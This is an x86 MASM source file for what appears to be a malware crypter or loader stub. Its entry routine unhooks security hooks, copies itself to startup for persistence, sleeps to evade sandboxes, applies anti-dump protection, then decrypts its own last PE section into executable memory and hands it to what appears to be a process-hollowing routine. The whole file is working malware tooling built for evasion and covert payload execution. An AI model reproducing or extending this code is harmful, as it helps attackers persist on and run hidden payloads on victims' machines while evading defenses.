.386
.model flat, stdcall
option casemap:none

include sup.Inc
include AntiDump.asm
include Unhook.asm
include Startup.asm
include ProcessHollowing.asm
include Decrypt.asm

.code

Delay PROC time:DWORD
	invoke lstrcmp, addr delay_check, addr sz_delay_check
	.if eax == -1
    	ret
	.endif
    invoke Sleep, time
    ret
Delay ENDP



start PROC
    LOCAL hModule:DWORD
    LOCAL sectionData:DWORD
    LOCAL sectionSize:DWORD
    LOCAL execMemory:DWORD
    LOCAL hFile:HANDLE

    invoke MessageBoxA, NULL, addr message_text, addr caption_text, MB_YESNO or MB_ICONWARNING
    cmp eax, IDNO
    je exit_error

    invoke unhook
    invoke CopyToStartup
    invoke Delay, 20000
    invoke AntiDump
    

    
    invoke GetModuleHandleA, NULL
    mov hModule, eax
    test eax, eax
    jz exit_error
    
    mov ebx, eax
    
    ; DOS MZ Header
    mov ax, word ptr [ebx]            ; +00  (0) WORD e_magic Magic number MZ (5A4D)
    cmp ax, 5A4Dh
    jne exit_error
    
    mov edx, [ebx + 3Ch]             ; +3C  (60) DWORD e_lfanew File address of new exe header
    add edx, ebx
    
    ; PE Header
    mov eax, [edx]                   ; +00  (0) DWORD Signature PE (00004550h)
    cmp eax, 00004550h
    jne exit_error
    
    mov ax, [edx + 6]                ; +06  (6) WORD Number of Sections
    test ax, ax
    jz exit_error
    
    movzx ecx, ax
    dec ecx
    
    ; Section Headers
    add edx, 0F8h                    ; +F8  (248) Start of Section Headers
    imul eax, ecx, 28h               ; +28  (40) Size of Section Header
    add edx, eax
    
    mov eax, [edx + 0Ch]             ; +0C  (12) DWORD VirtualAddress
    add eax, hModule
    mov sectionData, eax
    
    mov eax, [edx + 10h]             ; +10  (16) DWORD SizeOfRawData
    mov sectionSize, eax
    
    invoke VirtualAlloc, NULL, sectionSize, \
           MEM_COMMIT or MEM_RESERVE, PAGE_RWX
    mov execMemory, eax
    
    invoke Decrypt, sectionData, sectionSize, execMemory
    invoke CloseHandle, hFile
    invoke getPE, execMemory
    invoke VirtualFree, execMemory, 0, MEM_RELEASE
    
exit_error:
    invoke ExitProcess, 0
    
start ENDP
END start